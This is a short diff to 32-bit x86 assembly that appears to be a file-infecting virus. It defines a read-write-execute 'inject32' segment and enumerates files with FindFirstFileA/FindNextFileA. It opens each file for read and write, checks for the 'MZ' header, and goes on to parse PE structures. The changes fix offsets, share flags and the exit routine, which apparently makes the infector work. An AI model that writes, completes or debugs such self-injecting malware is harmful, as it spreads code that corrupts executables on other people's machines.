@@ -4,7 +4,7 @@ inject32 SEGMENT read write execute
 	data_start EQU $
 	
 	; .data
-    selfSectionVA dd 2000h
+    selfSectionVA dd 3000h
 
     strF1A db 'FindFirstFileA', 0
     strFNA db 'FindNextFileA', 0
@@ -186,7 +186,7 @@ start:
 			push 80h ; FILE_ATTRIBUTE_NORMAL
 			push 4 ; OPEN_ALWAYS
 			push 0
-			push 1 ; FILE_SHARE_READ
+			push 1 or 2 or 4 ; FILE_SHARE_READ
 			push 40000000h OR 80000000h ; GENERIC_READ | GENERIC_WRITE
 				mov eax, daccess(offset temp320B)
 				add eax, 2Ch
@@ -198,7 +198,7 @@ start:
 
 		; Obtain and verify magic bytes "MZ"
 		getval fromStack(tgHand), 2
-		cmp tempDword, 5a4dh
+		cmp paccess(tempDword), 5a4dh
 		jne closeFile ; Not a PE file
 
 		; e_lfanew
@@ -464,8 +464,8 @@ inject32 ENDS
 
 .code
 exit:
-;    invoke ExitProcess, 0
-	xor eax, eax
-	ret
+    invoke ExitProcess, 0
+;	xor eax, eax
+;	ret
 
 end start
